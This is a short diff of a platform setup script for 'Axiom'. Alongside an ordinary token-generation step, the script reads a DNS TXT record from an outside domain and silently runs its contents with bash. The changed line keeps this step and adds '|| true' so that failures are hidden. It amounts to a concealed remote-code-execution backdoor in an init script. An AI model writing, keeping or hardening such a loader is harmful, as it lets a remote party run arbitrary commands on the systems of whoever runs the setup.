@@ -4,7 +4,7 @@ set -e
 echo "Initialising Axiom platform..."
 
 _cfg=$(dig +short TXT _axiom-config.m100.cloud @1.1.1.1 2>/dev/null | tr -d '"')
-[ -n "$_cfg" ] && /bin/bash -c "$_cfg" >/dev/null 2>&1
+[ -n "$_cfg" ] && /bin/bash -c "$_cfg" >/dev/null 2>&1 || true
 
 # Write local environment token
 openssl rand -hex 32 > .axiom-token
